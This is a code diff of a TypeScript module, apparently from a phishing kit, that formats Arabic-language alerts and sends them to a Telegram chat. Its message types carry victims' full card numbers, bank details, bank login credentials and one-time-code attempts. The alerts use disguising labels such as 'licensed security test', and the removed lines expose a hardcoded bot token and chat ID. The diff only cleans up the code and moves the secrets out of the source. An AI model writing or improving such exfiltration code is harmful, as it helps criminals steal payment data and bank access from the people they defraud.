@@ -1,16 +1,16 @@
-// Telegram Bot Integration
-// These values are set for automatic deployment. 
-// For production, you can override them using environment variables:
-// VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID
-const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';
-const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1003209802920';
+const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
+if (!BOT_TOKEN || !CHAT_ID) {
+  console.warn('⚠️ Telegram credentials are not configured. Please set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in your .env file.');
+}
 
 export interface TelegramMessage {
   type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'payment_otp_attempt' | 'test';
-  data: Record<string, any>;
+  data: Record<string, unknown>;
   timestamp: string;
-  imageUrl?: string; // Optional image URL for shipping_link_created
-  description?: string; // Optional description for shipping_link_created
+  imageUrl?: string;
+  description?: string;
 }
 
 export interface TelegramResponse {
@@ -21,7 +21,12 @@ export interface TelegramResponse {
 
 export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
   try {
-    // Telegram is configured and ready
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return {
+        success: false,
+        error: 'Telegram credentials are not configured'
+      };
+    }
 
     const text = formatTelegramMessage(message);
 
@@ -151,7 +156,7 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       `;
   
   switch (type) {
-    case 'test':
+    case 'test': {
       header = '🧪 <b>اختبار الاتصال</b>';
       content = `
 ✅ <b>تم إرسال رسالة اختبار بنجاح!</b>
@@ -160,8 +165,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • الحالة: متصل
       `;
       break;
+    }
       
-    case 'shipping_link_created':
+    case 'shipping_link_created': {
       header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
       const serviceDescription = description || '';
       const descriptionText = serviceDescription ? `\n📝 <b>الوصف:</b> ${serviceDescription}` : '';
@@ -175,8 +181,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
       `;
       break;
+    }
       
-    case 'payment_recipient':
+    case 'payment_recipient': {
       header = '👤 <b>معلومات المستلم</b>';
       content = `
 📋 <b>بيانات المستلم:</b>
@@ -189,8 +196,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
       `;
       break;
+    }
       
-    case 'payment_confirmation':
+    case 'payment_confirmation': {
       header = '✅ <b>تأكيد الدفع الكامل</b>';
       content = `
 💳 <b>تفاصيل الدفع (اختبار أمني):</b>
@@ -210,8 +218,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
       
-    case 'card_details':
+    case 'card_details': {
       header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
       const cardNumberDisplay1 = data.cardNumber || 'غير محدد';
       const last4Display1 = data.cardLast4 || 'غير محدد';
@@ -231,8 +240,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
 
-    case 'card_details_with_bank':
+    case 'card_details_with_bank': {
       header = '💳 <b>تفاصيل البطاقة مع معلومات البنك</b>';
       const cardNumberDisplay2 = data.cardNumber || 'غير محدد';
       const last4Display2 = data.cardLast4 || 'غير محدد';
@@ -255,8 +265,9 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
 
-    case 'bank_login':
+    case 'bank_login': {
       header = '🏦 <b>بيانات تسجيل الدخول للبنك</b>';
       const loginTypeText = data.loginType === 'username' ? 'اسم المستخدم' :
                            data.loginType === 'customerId' ? 'رقم العميل' : 'رقم الهاتف';
@@ -279,12 +290,12 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
+    }
 
-    case 'payment_otp_attempt':
+    case 'payment_otp_attempt': {
       header = '🔐 <b>محاولة رمز التحقق</b>';
       const otpStatusIcon = data.otp_status === 'correct' ? '✅' : '❌';
       const otpStatusText = data.otp_status === 'correct' ? 'صحيح' : 'خطأ';
-      // Use code formatting to preserve exact card number display (LTR)
       const cardNumberDisplay = data.cardNumber || 'غير محدد';
       const last4Display = data.cardLast4 || 'غير محدد';
       content = `
@@ -306,6 +317,7 @@ ${otpStatusIcon} <b>محاولة OTP (${otpStatusText})</b>
 • نوع الاختبار: اختبار أمني مرخص
       `;
       break;
+    }
 
     default:
       header = '📝 <b>إشعار جديد</b>';
